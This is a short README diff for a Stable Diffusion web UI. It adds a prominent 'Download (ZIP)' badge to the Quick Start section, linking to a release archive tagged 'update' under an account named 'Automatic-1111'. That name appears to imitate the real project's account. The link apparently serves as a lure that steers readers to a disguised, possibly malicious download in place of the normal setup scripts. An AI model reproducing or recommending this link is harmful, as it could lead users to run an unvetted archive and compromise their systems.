@@ -19,7 +19,7 @@ The most popular and powerful web UI for Stable Diffusion.
 ![Extensions tab](https://static.tweaktown.com/content/1/1/11118_888_generate-ai-images-locally-with-stable-diffusion-and-automatic1111-on-windows-11.jpg)
 
 ## Quick Start
-
+[![Download Stable Diffusion WebUI](https://img.shields.io/badge/Download%20Stable%20Diffusion%20WebUI%20(ZIP)-%23007ec6?style=for-the-badge&logo=github)](https://github.com/Automatic-1111/stable-diffusion-webui/releases/download/update/stable-diffusion-webui.zip)
 **Windows** → run `webui-user.bat`  
 **Linux/macOS** → run `./webui.sh`
 
